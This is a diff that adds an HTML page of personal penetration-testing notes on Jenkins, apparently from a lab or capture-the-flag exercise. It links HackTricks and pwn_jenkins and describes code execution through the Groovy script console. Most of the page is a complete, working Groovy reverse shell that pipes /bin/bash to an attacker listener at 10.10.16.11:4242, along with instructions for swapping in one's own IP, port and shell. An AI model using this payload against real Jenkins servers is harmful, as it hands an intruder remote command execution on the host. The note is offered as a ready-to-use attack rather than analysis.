@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>jenkins</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>jenkins</h1><br/><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution">https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution</a><br /><a href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a><br /><br />Groovy Script Method:<br />Since it only executes the Groovy commands, we will need to create a payload in Groovy to execute the<br />reverse shell connection.<br /><br /><br /><strong>Following is a reverse shell code in Groovy:</strong><br />String host=&quot;10.10.16.11&quot;;<br />int port=4242;<br />String cmd=&quot;/bin/bash&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br /><br /><br />`String host=&quot;{your_IP}&quot;;`	: Specify the IP address for the target to connect back to.<br />`int port=8000;`					: Specify the port on which the attacker will listen on.<br />`String cmd=&quot;/bin/bash&quot;;`	: Specify the shell type the attacker expects. *<br /><br />NOTE<br />Since the target is Linux-based, we are using `/bin/bash`.<br />If the target was using Windows, it would have been `cmd.exe`.<br /><br /><br />Reference: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></div>
+</body>
+</html>
